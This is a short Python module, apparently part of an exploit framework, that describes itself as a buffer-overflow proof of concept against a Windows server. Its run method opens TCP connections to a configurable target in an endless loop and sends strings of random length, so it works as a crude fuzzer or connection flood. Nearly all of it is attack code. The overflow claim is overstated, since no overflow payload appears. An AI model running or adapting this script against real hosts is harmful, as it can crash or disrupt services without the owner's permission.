import socket
import time
import random
from core import logger
from colorama import Fore, Style

class Exploit:
	config={
		"RHOST": "127.0.0.1",
		"RPORT": "4444",
	}

	def show_options(self):
		print(Fore.YELLOW+"Options"+Style.RESET_ALL)
		print(Fore.YELLOW+"-------"+Style.RESET_ALL)
		for key in sorted(self.config.keys()):
			print(Fore.YELLOW+key, ":", self.get_config(key)+Style.RESET_ALL)
	


	
	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key] = value
		else:
			logger.error("No options")
	
	
	def get_config(self, key):
		return self.config[key]
	

	@staticmethod
	def show_info():
		logger.info("\nThis exploit tries to do a buffer \noverflow to a windows server its a Poc")

	def run(self):
		char="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-="

		while True:
			ran_char=random.choice(char)
			try:
				payload="echo "+ran_char*random.randint(10,550)
				sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.connect((self.config["RHOST"], int(self.config["RPORT"])))
				sock.send(bytes(payload,encoding='utf-8'))
				sock.close()
			except Exception as e:
				print(e)
				break
			except KeyboardInterrupt:
				print("^C Detected...")
				break
		exit()
